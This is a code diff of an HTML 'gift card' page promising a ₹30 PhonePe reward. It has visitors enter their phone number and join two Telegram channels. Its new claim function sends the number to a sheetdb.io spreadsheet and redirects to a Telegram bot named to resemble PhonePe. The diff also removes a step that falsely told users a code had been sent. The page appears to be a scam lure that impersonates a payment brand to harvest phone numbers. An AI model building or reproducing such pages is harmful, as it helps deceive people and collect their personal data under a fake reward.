@@ -15,10 +15,9 @@
         input { width: 100%; padding: 14px; margin-bottom: 15px; border: 2px solid #ce93d8; border-radius: 10px; font-size: 15px; outline: none; text-align: center; }
         .btn { width: 100%; background: #66bb6a; color: white; padding: 14px; border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 4px 10px rgba(102, 187, 106, 0.4); margin-bottom: 12px; }
         .btn-telegram { background: #0088cc; }
-        .btn-reward { background: #fbc02d; color: #000; font-weight: bold; }
+        .btn-claim { background: #d81b60; color: white; font-weight: bold; padding: 15px; font-size: 18px; }
         .step { display: none; }
         .active { display: block; }
-        .success-box { background: #f1f8e9; border: 2px dashed #4caf50; padding: 15px; border-radius: 12px; }
     </style>
 </head>
 <body>
@@ -29,7 +28,7 @@
     <div class="subtitle">Findo Lucky Special Task</div>
     <div class="reward-box"><span>🎁 ₹30 PhonePe Gift Card</span></div>
 
-    <!-- Step 1: Info -->
+    <!-- Step 1: Mobile -->
     <div id="step1" class="step active">
         <input type="text" id="contactInfo" placeholder="Enter Your Phone Number">
         <button class="btn" onclick="submitData()">Submit & Claim</button>
@@ -48,20 +47,11 @@
         <button class="btn btn-telegram" onclick="openChannel2()">3. Join Channel 2</button>
     </div>
 
-    <!-- Step 4: Get Reward Button -->
+    <!-- Step 4: Final Claim Button -->
     <div id="step4" class="step">
-        <p style="font-size:14px; color:#555;">Channels join kar liye? Ab niche button par click karke apna reward code lein:</p>
-        <button class="btn btn-reward" onclick="openBot()">🎁 GET REWARD CODE</button>
-    </div>
-
-    <!-- Step 5: Success Final -->
-    <div id="step5" class="step">
-        <div class="success-box">
-            <h3 style="color:#2e7d32; margin:0 0 10px 0;">✅ Done!</h3>
-            <p style="font-size: 15px; color: #333; margin: 0; font-weight: bold;">
-                Gift Code aapke Telegram par bhej diya gaya hai. Kripya check karein.
-            </p>
-        </div>
+        <p style="font-size:15px; color:#333; font-weight:bold;">Verification Completed!</p>
+        <p style="font-size:14px; color:#555; margin-bottom:20px;">Ab niche button par click karke <b>Gift Card</b> claim karein:</p>
+        <button class="btn btn-claim" onclick="claimReward()">🎁 CLAIM GIFT CARD</button>
     </div>
 </div>
 
@@ -84,6 +74,7 @@
     }
 
     function openChannel1() { window.open("https://t.me/findolucky", "_blank"); }
+
     function openChannel2() {
         window.open("https://t.me/+PIzW1L82h2g2Y2Nl", "_blank");
         setTimeout(() => {
@@ -92,20 +83,18 @@
         }, 1500);
     }
 
-    function openBot() {
-        // Yahan apne BOT ka link daalein (@PhonepayReward_Bot)
-        window.open("https://t.me/Phonepay_Reward_bot", "_blank"); 
-        
-        // Data save karein sheet me
+    function claimReward() {
+        // Data save karna (Optional, agar aapko user ka record rakhna hai)
         fetch('https://sheetdb.io/api/v1/obju8xm02uv6k', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ "Phone": savedInfo, "Status": "Clicked Reward", "Date": new Date().toLocaleString() })
+            body: JSON.stringify({ "Phone": savedInfo, "Status": "Clicked Claim", "Date": new Date().toLocaleString() })
         });
 
-        document.getElementById('step4').classList.remove('active');
-        document.getElementById('step5').classList.add('active');
+        // Bot par redirect
+        window.open("https://t.me/Phonepay_Reward_bot", "_blank");
     }
 </script>
+
 </body>
 </html>
